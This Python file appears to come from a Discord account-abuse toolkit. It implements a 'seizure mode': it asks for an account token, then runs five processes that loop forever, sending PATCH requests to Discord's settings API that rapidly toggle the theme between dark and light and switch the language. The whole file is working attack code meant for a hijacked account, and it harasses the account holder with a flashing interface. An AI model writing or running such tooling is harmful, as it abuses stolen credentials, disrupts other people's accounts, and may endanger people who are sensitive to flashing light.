import random

import requests
from colorama import Fore
from util.plugins.common import *


def StartSeizure(token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v10/users/@me/settings", headers=getheaders(token), json=setting)


def Seizure():
    token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
    validateToken(token)
    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.WHITE}(Switching on/off Light/dark mode)\n')
    processes = []
    threads = 5
    for i in range(threads):
        t = multiprocessing.Process(target=StartSeizure, args=(token,))
        t.start()
        processes.append(t)